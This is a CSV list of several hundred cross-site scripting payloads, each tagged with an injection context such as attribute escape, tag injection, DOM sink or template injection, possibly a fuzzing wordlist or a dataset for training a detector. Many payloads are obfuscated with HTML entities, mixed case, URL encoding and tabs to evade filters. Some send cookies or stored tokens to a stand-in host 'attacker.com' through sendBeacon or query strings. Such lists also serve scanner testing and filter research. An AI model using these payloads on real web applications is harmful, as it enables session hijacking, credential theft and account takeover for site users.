payload,context
%27 ><svg onvolumechange=alert(%27XSS%27)>,attribute_escape
onfocusin=confirm/*x*/(docum&#101;nt.dom&#97;in),event_handler
<button x=y ondragenter=alert(location.hash)>,tag_injection
\%27 ongesturestart=prompt(%27XSS%27)//,attribute_escape
"LocAtiOn.HreF=""JavAscRipT:fEtcH(dOcuMenT.cOokIe+'&lOc='+lOcaTioN.hRef)""",dom_sink
<template/onreset=alert(location.hash)>,tag_injection
%3Cform onsearch=console.log(1)%3E,tag_injection
OnkEydOwn=coNsoLe.Log/**/(dOcuMenT.dOmaIn),event_handler
<teXtaRea onScrOllEnd=alErt('XSS') oNscRolLenD=aLerT('XSS')>,tag_injection
&quot; ontouchmove=prompt(%27XSS%27) x=&quot;,attribute_escape
&quot; onhashchange=prompt(%27XSS%27) x=&quot;,attribute_escape
""" ongestureend=prompt('XSS') """,attribute_escape
<SCRIPT>consol&#101;.log('XSS')</SCRIPT>,script_injection
%3Cform src=x onwaiting=confirm(1)%3E,tag_injection
'><img src=x onwebkitfullscreenchange=alert('XSS')>,attribute_escape
"__pRotO__[""oNbeForEcuT""]=coNsoLe.Log(doCumEnt.doMaiN)",dom_sink
`><Img srC=x onAniMatIonIteRatIon=coNfiRm('XSS')>,attribute_escape
OnpAgeRevEal=jaVasCriPt:ConFirM(dOcuMenT.dOmaIn),event_handler
"<script
>prompt(1)</script>",script_injection
"\"" OntOucHstArt=alErt(StRinG.fRomChaRCoDe(88,83,83))//",attribute_escape
"eval(""prompt(document.domain)"")",dom_sink
"<select
onanimationstart=prompt('XSS')>",tag_injection
""" onmouseenter=console.log(String.fromCharCode(88,83,83)) """,attribute_escape
"element.setAttribute(%22onclick%22,%22eval(document.domain)%22)",dom_sink
"&#101;l&#101;m&#101;nt.ins&#101;rtAdj&#97;c&#101;ntHTML(""b&#101;for&#101;&#101;nd"",""<img src=x on&#101;rror=confirm(docum&#101;nt.cooki&#101;)>"")",dom_sink
'><img src=x onscroll&#101;nd=prompt(loc&#97;tion.h&#97;sh)>,attribute_escape
' ong&#101;stur&#101;&#101;nd=consol&#101;.log(loc&#97;tion.h&#97;sh) ',attribute_escape
' ontr&#97;nsitionst&#97;rt=confirm(docum&#101;nt.dom&#97;in) ',attribute_escape
' %3E%3Csvg onbegin=confirm(1)%3E,attribute_escape
"Object.assign(window,{%22onanimationiteration%22:fetch})",dom_sink
${pRomPt('XSS')|n},template_injection
&quot; onsearch=confirm(1) x=&quot;,attribute_escape
onmozfullscr&#101;&#101;nch&#97;ng&#101;=prompt/***/(loc&#97;tion.h&#97;sh),event_handler
%22><img src=x onsearch=alert(%27XSS%27)>,attribute_escape
"""><im&#97;g&#101; on&#101;nd=prompt(1)>",tag_injection
OnaNimAtiOncAncEl=JavAscRipT:pRomPt(LocAtiOn.HasH),event_handler
"\' ontouchstart=confirm(String.fromCharCode(88,83,83))//",attribute_escape
'><img src=x onpopstate=alert('XSS')>,attribute_escape
"' onbeforetoggle=alert(String.fromCharCode(88,83,83)) '",attribute_escape
"<maTh
OnsCroLleNd=ProMpt(doCumEnt.doMaiN)>",tag_injection
<script>Function('consol&#101;.log(1)')();</script>,script_injection
<tiTle onBluR=cOnsOle.loG(lOcaTioN.hAsh) oNblUr=ConSolE.lOg(LocAtiOn.HasH)>,tag_injection
%3Cset/oncanplay=confirm(1)%3E,tag_injection
&#106;avascr	ipt:console.log('XSS'),js_uri
`><img src=x onwheel=\u0061lert('XSS')>,attribute_escape
j&#97;v&#97;script:void(prompt(docum&#101;nt.dom&#97;in)),js_uri
	onGotPoiNteRcaPtuRe=ProMpt(loCatIon.haSh),event_handler
%27><img src=x onpointermove=confirm(document.domain)>,attribute_escape
"""%3E%3Cimg src=x onerror=console.log(document.domain)%3E",attribute_escape
`><img src=x onwebkitanimationend=console.log(document.domain)>,attribute_escape
"__proto__[%22onblur%22]=prompt(navigator.sendBeacon(%27//attacker.com%27,document.cookie))",dom_sink
' %3E%3Csvg ontouchend=console.log('XSS')%3E,attribute_escape
""" onwh&#101;&#101;l=consol&#101;.log(docum&#101;nt.dom&#97;in) """,attribute_escape
<script	>confirm('XSS')</script>,script_injection
onpaste=confirm(document.domain),event_handler
"""><Img srC=x onScrOllEnd=prOmpT(lOcaTioN.hAsh)>",attribute_escape
"location.href=""javascript:XMLHttpRequest(document.cookie)""",dom_sink
"\"" OnsCroLlsNapChaNge=prOmpT(STriNg.FroMChArCOde(88,83,83))//",attribute_escape
'><img src=x on&#97;nim&#97;tionit&#101;r&#97;tion=prompt(1)>,attribute_escape
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""&#101;v&#97;l(1)""",dom_sink
"EvaL(""AleRt(1)"")",dom_sink
""" ><svg onmous&#101;&#101;nt&#101;r=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
<script>/*/&#97;l&#101;rt('XSS')</script>,script_injection
"`%3E%3Cimg src=x onmozfullscreenchange=alert(String.fromCharCode(88,83,83))%3E",attribute_escape
\%22 ongesturestart=alert(1)//,attribute_escape
<noscript ongesturestart=\u0061lert('XSS') ongesturestart=\u0061lert('XSS')>,tag_injection
'><script>\u0061lert('XSS')</script>,script_injection
""" oNcaNplAy=ConSolE.lOg(LocAtiOn.HasH) """,attribute_escape
<source oninput=\u0061lert(location.hash)/>,tag_injection
<!--><TemPlaTe OncLosE=cOnsOle.loG(1)>,tag_injection
<script>/x/prompt(docum&#101;nt.dom&#97;in)</script>,script_injection
	onMouSeeNteR=aLerT(lOcaTioN.hAsh),event_handler
\' OnpOpsTatE=pRomPt(1)//,attribute_escape
	onclos&#101;=consol&#101;.log('XSS'),event_handler
"\"" onanimationiteration=prompt(1)//",attribute_escape
window[%22XMLHttpRequest%22](1),dom_sink
"window[""alert""]('//attacker.com/?c='+document.cookie)",dom_sink
"&#101;l&#101;m&#101;nt.ins&#101;rtAdj&#97;c&#101;ntHTML(""b&#101;for&#101;&#101;nd"",""<img src=x on&#101;rror=confirm('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)>"")",dom_sink
""" ><svG oNauXclIck=coNsoLe.Log(1)>",attribute_escape
<embed/onmozfullscreenchange=confirm(location.hash)>,tag_injection
"element.setAttribute(""onclick"",""confirm(document.cookie+'&loc='+location.href)"")",dom_sink
' oNcuT=aLerT('XSS') ',attribute_escape
"location.href=""javascr	ipt:prompt(document.cookie)""",dom_sink
""" oncopy=prompt(document.domain) """,attribute_escape
" onRepEat=alErt(StRinG.fRomChaRCoDe(88,83,83))",event_handler
%27><img src=x onpromptdismiss=alert(document.domain)>,attribute_escape
"' ><svG oNbeGin=alErt(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape
%22 ><svg onpagereveal=confirm(document.domain)>,attribute_escape
<m&#101;t&#97; onpoint&#101;rov&#101;r=confirm(1) onpoint&#101;rov&#101;r=confirm(1)>,tag_injection
OnwHeeL=pRomPt/*x*/(1),event_handler
"'><ScrIpt>prOmpT(STriNg.FroMChArCOde(88,83,83))</scRipT>",script_injection
"\' onpromptdismiss=prompt(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
""" on&#101;nd&#101;d=consol&#101;.log(1) """,attribute_escape
\' onanimationiteration=console.log(1)//,attribute_escape
'%3E%3Cimg src=x onpause=console.log('XSS')%3E,attribute_escape
"Object.assign(window,{""onwebkitfullscreenchange"":prompt})",dom_sink
%3Csvg onpromptdismiss=alert(location.hash)%3E,tag_injection
'><Img srC=x onDraGenTer=coNfiRm('XSS')>,attribute_escape
""" ><svg onbeforematch=confirm(1)>",attribute_escape
""" onvolumechange=confirm('XSS') """,attribute_escape
OnwEbkItfUllScrEenChaNge=alErt&#40;dOcuMenT.dOmaIn&#41;,event_handler
"' %3E%3Csvg onpointermove=alert(String.fromCharCode(88,83,83))%3E",attribute_escape
<base onkeydown=\u0061lert('XSS')>,tag_injection
\%27 onbeforecut=confirm(1)//,attribute_escape
{{constructor['constructor']('\u0061lert(document.domain)')()}},template_injection
%3Cform x=y onwebkittransitionend=prompt(location.hash)%3E,tag_injection
<m&#97;rqu&#101;&#101;	on&#97;uxclick=prompt(loc&#97;tion.h&#97;sh)>,tag_injection
&quot; on&#101;nd&#101;d=prompt('XSS') x=&quot;,attribute_escape
""" ontouchmov&#101;=confirm('XSS') """,attribute_escape
ongotpoint&#101;rc&#97;ptur&#101;=consol&#101;.log/*x*/('XSS'),event_handler
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=pRomPt(StrIng.frOmCHarCodE(88,83,83))>"")",dom_sink
{{$on.constructor(%27confirm(1)%27)()}},template_injection
<mtext onended=confirm(document.domain)>,tag_injection
"__proto__[""oninput""]=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)",dom_sink
%22 onmouseover=console.log(%27XSS%27) x=%22,attribute_escape
"%27 onanimationstart=alert(String.fromCharCode(88,83,83)) %27",attribute_escape
"""%3E%3Cimg src=x ongestureend=console.log(location.hash)%3E",attribute_escape
`><Img srC=x onMouSewHeeL=aLerT(dOcuMenT.dOmaIn)>,attribute_escape
""" ><svg ondrop=confirm(1)>",attribute_escape
\' OncUt=ConFirM(1)//,attribute_escape
`><img src=x on&#97;uxclick=confirm(loc&#97;tion.h&#97;sh)>,attribute_escape
"' ><svg on&#101;nd=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
ontr&#97;nsitionrun=j&#97;v&#97;script:&#97;l&#101;rt(1),event_handler
<script>/x/console.log('XSS')</script>,script_injection
' ><svg ondblclick=&#97;l&#101;rt(1)>,attribute_escape
`><Img srC=x onProMptDisMisS=aLerT(dOcuMenT.dOmaIn)>,attribute_escape
<teMplAte srC=x onCloSe=ConSolE.lOg(1)>,tag_injection
""" onp&#97;us&#101;=consol&#101;.log('XSS') """,attribute_escape
<script	>prompt(%27XSS%27)</script>,script_injection
"""><img src=x onfocusout=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
onk&#101;ydown=prompt&#40;loc&#97;tion.h&#97;sh&#41;,event_handler
"s&#101;tTim&#101;out(""prompt('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)"",0)",dom_sink
<auDio onScrOllEnd=prOmpT(lOcaTioN.hAsh) oNscRolLenD=pRomPt(LocAtiOn.HasH)>,tag_injection
<noscript onbeforematch=console.log('XSS')/>,tag_injection
"""><Img srC=x onEndEd=ConSolE.lOg(DocUmeNt.DomAin)>",attribute_escape
"'%3E%3Cimg src=x ongotpointercapture=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape
`><img src=x ontouchstart=confirm('XSS')>,attribute_escape
OnsUbmIt=AleRt&#40;loCatIon.haSh&#41;,event_handler
"LocAtiOn.HreF=""JavAscRipT:fEtcH(nAviGatOr.SenDBeAcoN('//aTtaCkeR.cOm',doCumEnt.coOkiE))""",dom_sink
' %3E%3Csvg onfullscreenchange=alert(location.hash)%3E,attribute_escape
'><img src=x onerror=alert(document.domain)>,attribute_escape
ontransitionrun=alert&#40;document.domain&#41;,event_handler
document.body.innerHTML=%22<img src=x onerror=confirm(document.domain)>%22,dom_sink
"	onbeforepaste=alert(String.fromCharCode(88,83,83))",event_handler
"\' OnpRomPtaCtiOn=ConFirM(STriNg.FroMChArCOde(88,83,83))//",attribute_escape
' oNbeForEcoPy=ProMpt(loCatIon.haSh) ',attribute_escape
 ondblclick=consol&#101;.log(1),event_handler
'><img src=x ongotpointercapture=alert(1)>,attribute_escape
'%3E%3Cimg src=x ondblclick=confirm(1)%3E,attribute_escape
OnrEseT=jAvaScrIpt:coNfiRm('XSS'),event_handler
"(n&#101;w Function(""confirm(String.fromCh&#97;rCod&#101;(88,83,83))""))();",dom_sink
"onpointermove=javascript:prompt(String.fromCharCode(88,83,83))",event_handler
"setTimeout(%22fetch(btoa(document.cookie))%22,0)",dom_sink
<obJecT oNvoLumEchAngE=aLerT(1)/>,tag_injection
"' oNmoZfuLlsCreEncHanGe=AleRt(StrIng.frOmCHarCodE(88,83,83)) '",attribute_escape
"\"" oncontextmenu=\u0061lert(1)//",attribute_escape
<animate x=y onpageshow=console.log(%27XSS%27)>,tag_injection
"`><img src=x on&#101;nd&#101;d=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
	onhashchange=confirm('XSS'),event_handler
"'><img src=x onpoint&#101;rmov&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
"__pRotO__[""oNtrAnsItiOneNd""]=XMLHTtpReqUesT(lOcaLStOraGe.GetIteM('TokEn'))",dom_sink
"\"" onpagehide=prompt('XSS')//",attribute_escape
""" onscrollsn&#97;pch&#97;ng&#101;=consol&#101;.log(1) """,attribute_escape
OndRagEntEr=ProMpt(doCumEnt.doMaiN),event_handler
<maTh X=y onCopY=cOnsOle.loG(dOcuMenT.dOmaIn)>,tag_injection
"<foRm Src=x OnwEbkItfUllScrEenChaNge=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
"'%3E%3Cimg src=x ontoggle=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape
__${alert(%27XSS%27)}__::.x,template_injection
&quOt; onPoiNteRraWupDatE=aLerT('XSS') X=&QuoT;,attribute_escape
__proto__[%22onkeypress%22]=XMLHttpRequest(1),dom_sink
""" onkeypress=console.log(String.fromCharCode(88,83,83)) """,attribute_escape
"\' onanimationiteration=console.log(String.fromCharCode(88,83,83))//",attribute_escape
"""><Img srC=x onPoiNteRovEr=ConSolE.lOg('XSS')>",attribute_escape
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""&#97;l&#101;rt('XSS')""",dom_sink
%22 ><svg ondrop=prompt(%27XSS%27)>,attribute_escape
"element.setAttribute(""onclick"",""\u0061lert(navigator.sendBeacon('//attacker.com',document.cookie))"")",dom_sink
"""%3E%3Cimage onend=prompt(1)%3E",tag_injection
<obj&#101;ct src=x onb&#101;for&#101;p&#97;st&#101;=confirm(docum&#101;nt.dom&#97;in)>,tag_injection
onscroll&#101;nd=j&#97;v&#97;script:prompt(1),event_handler
""" onfocus=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) &#97;utofocus=""",attribute_escape
"%22><img src=x onanimationcancel=alert(String.fromCharCode(88,83,83))>",attribute_escape
""" ><svg onkeydown=prompt(String.fromCharCode(88,83,83))>",attribute_escape
"javascript:/*-/*`/*\`/*%27/*%22/**/(/* */oNcliCk=prompt(String.fromCharCode(88,83,83)) )//%0D%0A%0d%0a",js_uri
'%3E%3Cimg src=x onstalled=prompt(1)%3E,attribute_escape
&quot; ondragstart=console.log(document.domain) x=&quot;,attribute_escape
"\"" onrepeat=alert(location.hash)//",attribute_escape
' %3E%3Csvg oncanplay=prompt(document.domain)%3E,attribute_escape
<body oninv&#97;lid=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)/>,tag_injection
"""%3E%3Cimg src=x onpaste=console.log(document.domain)%3E",attribute_escape
"s&#101;tInt&#101;rv&#97;l(""&#97;l&#101;rt(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)"",100)",dom_sink
"Object.assign(window,{""onpointermove"":fetch})",dom_sink
"""><&#97;r&#101;&#97; on&#101;nd&#101;d=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
<img	onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt('XSS')>,tag_injection
"<m&#97;th
onpl&#97;ying=consol&#101;.log('XSS')>",tag_injection
""" onpointerup=prompt(location.hash) """,attribute_escape
""" oNgoTpoIntErcAptUre=prOmpT('XSS') """,attribute_escape
&quot; ong&#101;stur&#101;&#101;nd=&#97;l&#101;rt(1) x=&quot;,attribute_escape
"ObjEct.asSigN(wIndOw,{""oNpaGerEveAl"":coNsoLe.Log})",dom_sink
"Object.assign(window,{%22onpointerdown%22:XMLHttpRequest})",dom_sink
"""><img src=x onmous&#101;wh&#101;&#101;l=prompt('XSS')>",attribute_escape
' ><svg onpagereveal=\u0061lert(location.hash)>,attribute_escape
"setTimeout(""confirm(1)"",0)",dom_sink
"%3Cdiv	onpause=prompt(String.fromCharCode(88,83,83))%3E",tag_injection
"\"" OnbEfoRetOggLe=ConFirM(lOcaTioN.hAsh)//",attribute_escape
""" ><svg onfocus=&#97;l&#101;rt(1)>",attribute_escape
"\"" ontouchstart=console.log(1)//",attribute_escape
"""><tr onpointerrawupdate=alert(location.hash)>",tag_injection
__proto__[%22onanimationend%22]=fetch(location.hash),dom_sink
"""><t&#101;mpl&#97;t&#101; onr&#101;s&#101;t=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection
{{$On.ConStrUctOr('prOmpT(dOcuMenT.cOokIe)')()}},template_injection
<textarea src=x onscrollend=alert('XSS')>,tag_injection
' ><svG oNtoUchEnd=coNfiRm('XSS')>,attribute_escape
	onpageshow=confirm(1),event_handler
<t&#97;bl&#101; onmozfullscr&#101;&#101;nch&#97;ng&#101;=confirm(1)/>,tag_injection
"""><img src=x ontouchmov&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",attribute_escape
""" ><svg onmouseenter=confirm(String.fromCharCode(88,83,83))>",attribute_escape
'><img src=x onfocusout=consol&#101;.log(loc&#97;tion.h&#97;sh)>,attribute_escape
<s&#101;l&#101;ct on&#97;nim&#97;tionst&#97;rt=prompt('XSS') on&#97;nim&#97;tionst&#97;rt=prompt('XSS')>,tag_injection
"""><Td OnkEyuP=cOnfIrm(doCumEnt.doMaiN)>",tag_injection
' ><svG oNtrAnsItiOnsTarT=cOnfIrm(doCumEnt.doMaiN)>,attribute_escape
java	scr	ipt:console.log(document.domain),js_uri
"\"" onclose=alert(document.domain)//",attribute_escape
`><Img srC=x onSelEct=coNfiRm(LocAtiOn.HasH)>,attribute_escape
<blink src=x onk&#101;ypr&#101;ss=prompt(docum&#101;nt.dom&#97;in)>,tag_injection
"s&#101;tTim&#101;out(""confirm(1)"",0)",dom_sink
"DocUmeNt.QueRySEleCtoR(""BodY"").inNerHTML+=""XMLHtTpREquEst(btOa(DocUmeNt.CooKie))""",dom_sink
<s&#101;l&#101;ct	onvolum&#101;ch&#97;ng&#101;=consol&#101;.log(1)>,tag_injection
"setTimeout(%22confirm(%27XSS%27)%22,0)",dom_sink
' onpagehide=prompt(document.domain) ',attribute_escape
<noScrIpt onPasTe=ConFirM(lOcaTioN.hAsh)>,tag_injection
`><img src=x oncopy=console.log(%27XSS%27)>,attribute_escape
"%22><iframe ontouchstart=prompt(String.fromCharCode(88,83,83))>",tag_injection
%3Cblink x=y onmouseup=alert(1)%3E,tag_injection
"onmozfullscr&#101;&#101;nch&#97;ng&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
{{[].pOp.ConStrUctOr('coNfiRm(1)')()}},template_injection
"OnbEfoRecOpy=alErt/**/(STriNg.FroMChArCOde(88,83,83))",event_handler
%22><img src=x ontouchend=console.log(1)>,attribute_escape
'><img src=x onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,attribute_escape
OnmOusEenTer=coNfiRm/***/(lOcaTioN.hAsh),event_handler
"""><math oncopy=console.log(document.domain)>",tag_injection
__proto__[%22ontransitionrun%22]=confirm(localStorage.getItem(%27token%27)),dom_sink
\' OncOpy=prOmpT(dOcuMenT.dOmaIn)//,attribute_escape
\' onmous&#101;wh&#101;&#101;l=prompt(docum&#101;nt.dom&#97;in)//,attribute_escape
{{&#97;l&#101;rt(docum&#101;nt.dom&#97;in)}},template_injection
%3Cimg/onwebkitfullscreenchange=alert('XSS')%3E,tag_injection
""" ><svg onpointerover=confirm(String.fromCharCode(88,83,83))>",attribute_escape
__proto__[%22onfocusout%22]=confirm(1),dom_sink
onpopstate=confirm('XSS'),event_handler
"\%22 onanimationcancel=alert(String.fromCharCode(88,83,83))//",attribute_escape
"eval(%22XMLHttpRequest(navigator.sendBeacon(%27//attacker.com%27,document.cookie))%22)",dom_sink
"	onk&#101;ydown=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
onrepeat=\u0061lert&#40;location.hash&#41;,event_handler
<form onr&#101;s&#101;t=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
'><img src=x ondblclick=confirm(1)>,attribute_escape
' ><svg on&#97;nim&#97;tion&#101;nd=confirm(docum&#101;nt.dom&#97;in)>,attribute_escape
"""><img src=x oncont&#101;xtm&#101;nu=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>",attribute_escape
"__proto__[%22onbeforecopy%22]=console.log(String.fromCharCode(88,83,83))",dom_sink
"Obj&#101;ct.&#97;ssign(window,{""onp&#97;g&#101;sw&#97;p"":&#101;v&#97;l})",dom_sink
"Object.assign(window,{""onpromptaction"":fetch})",dom_sink
"%22 onclose=console.log(String.fromCharCode(88,83,83)) %22",attribute_escape
"""><Img srC=x onScrOllSnaPchAngE=pRomPt(LocAtiOn.HasH)>",attribute_escape
"LocAtiOn.HreF=""JavAscRipT:cOnsOle.loG(nAviGatOr.SenDBeAcoN('//aTtaCkeR.cOm',doCumEnt.coOkiE))""",dom_sink
""" oNprOmpTacTioN=pRomPt(1) """,attribute_escape
' ><svG oNblUr=AleRt(LocAtiOn.HasH)>,attribute_escape
javascript:/*-/*`/*\`/*%27/*%22/**/(/* */oNcliCk=console.log(location.hash) )//%0D%0A%0d%0a,js_uri
<!--><obj&#101;ct onsubmit=confirm(loc&#97;tion.h&#97;sh)>,tag_injection
"setInterval(""fetch(localStorage.getItem('token'))"",100)",dom_sink
" onInpUt=ProMpt(StRinG.fRomChaRCoDe(88,83,83))",event_handler
[#cOnfIrm doCumEnt.coOkiE /],template_injection
onsubmit=javascr	ipt:confirm(document.domain),event_handler
%3Cobject src=x onmozfullscreenchange=console.log(1)%3E,tag_injection
%22 onpointerrawupdate=prompt(%27XSS%27) %22,attribute_escape
\%22 ondrop=confirm(1)//,attribute_escape
"&#101;v&#97;l(""&#97;l&#101;rt(docum&#101;nt.dom&#97;in)"")",dom_sink
"${{'confirm(1)'.replace('confirm(1)','')}}",template_injection
"<maRquEe X=y onProMptDisMisS=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))>",tag_injection
"document.querySelector(%22body%22).innerHTML+=%22fetch(String.fromCharCode(88,83,83))%22",dom_sink
"Obj&#101;ct.&#97;ssign(window,{""onclos&#101;"":prompt})",dom_sink
<link oninput=\u0061lert(document.domain)>,tag_injection
`><Img srC=x onFocUsoUt=ConFirM(lOcaTioN.hAsh)>,attribute_escape
""" onpromptdismiss=prompt(document.domain) """,attribute_escape
ontransitionstart=console.log/***/('XSS'),event_handler
' oNanImaTioNenD=cOnfIrm(loCatIon.haSh) ',attribute_escape
"""><Img srC=x onBluR=aLerT(lOcaTioN.hAsh)>",attribute_escape
 ontouch&#101;nd=&#97;l&#101;rt(loc&#97;tion.h&#97;sh),event_handler
"onst&#97;ll&#101;d=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
"onvolumechange=alert/*x*/(String.fromCharCode(88,83,83))",event_handler
${cOnfIrm('XSS')},template_injection
"__proto__[""onw&#97;iting""]=prompt(docum&#101;nt.cooki&#101;)",dom_sink
<s&#101;l&#101;ct src=x ongotpoint&#101;rc&#97;ptur&#101;=confirm(docum&#101;nt.dom&#97;in)>,tag_injection
<form onwaiting=confirm(1) onwaiting=confirm(1)>,tag_injection
"__proto__[""onmous&#101;&#101;nt&#101;r""]=XMLHttpR&#101;qu&#101;st('XSS')",dom_sink
<seT x=y OnfOcuS=pRomPt(DocUmeNt.DomAin)>,tag_injection
<!--><AniMatEmoTioN oNgeStuResTarT=cOnfIrm(1)>,tag_injection
"%27 onpointerup=confirm(String.fromCharCode(88,83,83)) %27",attribute_escape
<&#97;udio/onscroll&#101;nd=prompt(loc&#97;tion.h&#97;sh)>,tag_injection
